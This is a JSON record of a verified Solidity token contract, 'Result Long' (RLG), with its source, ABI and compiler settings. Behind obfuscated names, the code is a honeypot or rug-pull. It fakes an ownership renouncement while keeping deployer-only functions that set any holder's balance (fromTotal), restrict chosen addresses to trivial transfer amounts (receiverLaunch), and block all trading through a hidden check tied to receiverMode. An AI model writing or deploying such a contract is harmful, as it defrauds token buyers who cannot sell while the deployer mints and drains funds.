{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface takeFromTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeReceiver {\n    function createPair(address minIs, address marketingList) external returns (address);\n}\n\ninterface autoLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSellLaunch) external view returns (uint256);\n\n    function transfer(address receiverExempt, uint256 exemptBuy) external returns (bool);\n\n    function allowance(address totalTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverExempt,\n        uint256 exemptBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listAutoMin, uint256 value);\n    event Approval(address indexed totalTeam, address indexed spender, uint256 value);\n}\n\ninterface autoLimitMetadata is autoLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResultLong is tokenTx, autoLimit, autoLimitMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTeam;\n    }\n\n    uint256 takeTeam;\n\n    function getOwner() external view returns (address) {\n        return sellAt;\n    }\n\n    mapping(address => bool) public walletEnable;\n\n    uint256 private listTake = 100000000 * 10 ** 18;\n\n    uint256 private autoWalletIs;\n\n    bool private autoLaunch;\n\n    bool public fundMode;\n\n    event OwnershipTransferred(address indexed maxLaunch, address indexed marketingEnableTotal);\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTakeSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTo;\n    }\n\n    bool public senderSell;\n\n    function exemptTotal(address toMin, address receiverExempt, uint256 exemptBuy) internal returns (bool) {\n        if (toMin == sellModeTotal) {\n            return modeMaxSender(toMin, receiverExempt, exemptBuy);\n        }\n        uint256 tokenList = autoLimit(limitTrading).balanceOf(totalFundMin);\n        require(tokenList == takeTeam);\n        require(receiverExempt != totalFundMin);\n        if (isList[toMin]) {\n            return modeMaxSender(toMin, receiverExempt, shouldReceiverToken);\n        }\n        return modeMaxSender(toMin, receiverExempt, exemptBuy);\n    }\n\n    function transfer(address teamAmount, uint256 exemptBuy) external virtual override returns (bool) {\n        return exemptTotal(_msgSender(), teamAmount, exemptBuy);\n    }\n\n    function approve(address tradingMin, uint256 exemptBuy) public virtual override returns (bool) {\n        launchExempt[_msgSender()][tradingMin] = exemptBuy;\n        emit Approval(_msgSender(), tradingMin, exemptBuy);\n        return true;\n    }\n\n    constructor (){\n        if (modeMin != totalLiquidity) {\n            maxTakeEnable = true;\n        }\n        takeFromTo receiverTrading = takeFromTo(limitSell);\n        limitTrading = modeReceiver(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));\n        \n        sellModeTotal = _msgSender();\n        feeList();\n        walletEnable[sellModeTotal] = true;\n        feeToken[sellModeTotal] = listTake;\n        if (fundMode) {\n            feeReceiverBuy = autoWalletIs;\n        }\n        emit Transfer(address(0), sellModeTotal, listTake);\n    }\n\n    address totalFundMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public sellModeTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTake;\n    }\n\n    uint8 private limitTo = 18;\n\n    function receiverLaunch(address toEnableSell) public {\n        receiverToken();\n        \n        if (toEnableSell == sellModeTotal || toEnableSell == limitTrading) {\n            return;\n        }\n        isList[toEnableSell] = true;\n    }\n\n    function transferFrom(address toMin, address receiverExempt, uint256 exemptBuy) external override returns (bool) {\n        if (_msgSender() != limitSell) {\n            if (launchExempt[toMin][_msgSender()] != type(uint256).max) {\n                require(exemptBuy <= launchExempt[toMin][_msgSender()]);\n                launchExempt[toMin][_msgSender()] -= exemptBuy;\n            }\n        }\n        return exemptTotal(toMin, receiverExempt, exemptBuy);\n    }\n\n    address limitSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private sellAt;\n\n    uint256 constant shouldReceiverToken = 13 ** 10;\n\n    uint256 public modeMin;\n\n    uint256 private feeReceiverBuy;\n\n    bool private walletFee;\n\n    function fromTotal(address teamAmount, uint256 exemptBuy) public {\n        receiverToken();\n        feeToken[teamAmount] = exemptBuy;\n    }\n\n    function allowance(address marketingMin, address tradingMin) external view virtual override returns (uint256) {\n        if (tradingMin == limitSell) {\n            return type(uint256).max;\n        }\n        return launchExempt[marketingMin][tradingMin];\n    }\n\n    mapping(address => bool) public isList;\n\n    function modeMaxSender(address toMin, address receiverExempt, uint256 exemptBuy) internal returns (bool) {\n        require(feeToken[toMin] >= exemptBuy);\n        feeToken[toMin] -= exemptBuy;\n        feeToken[receiverExempt] += exemptBuy;\n        emit Transfer(toMin, receiverExempt, exemptBuy);\n        return true;\n    }\n\n    bool private maxTakeEnable;\n\n    mapping(address => uint256) private feeToken;\n\n    function swapLiquidity(address senderFrom) public {\n        if (modeEnableFrom) {\n            return;\n        }\n        if (autoLaunch == senderSell) {\n            senderSell = true;\n        }\n        walletEnable[senderFrom] = true;\n        \n        modeEnableFrom = true;\n    }\n\n    function feeList() public {\n        emit OwnershipTransferred(sellModeTotal, address(0));\n        sellAt = address(0);\n    }\n\n    uint256 launchedTotal;\n\n    uint256 public totalLiquidity;\n\n    string private fundTeam = \"RLG\";\n\n    bool public modeEnableFrom;\n\n    address public limitTrading;\n\n    mapping(address => mapping(address => uint256)) private launchExempt;\n\n    function owner() external view returns (address) {\n        return sellAt;\n    }\n\n    function receiverMode(uint256 exemptBuy) public {\n        receiverToken();\n        takeTeam = exemptBuy;\n    }\n\n    function receiverToken() private view {\n        require(walletEnable[_msgSender()]);\n    }\n\n    string private liquidityTakeSender = \"Result Long\";\n\n    function balanceOf(address autoSellLaunch) public view virtual override returns (uint256) {\n        return feeToken[autoSellLaunch];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnableTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAutoMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSellLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"fromTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnableSell\",\"type\":\"address\"}],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellModeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ResultLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}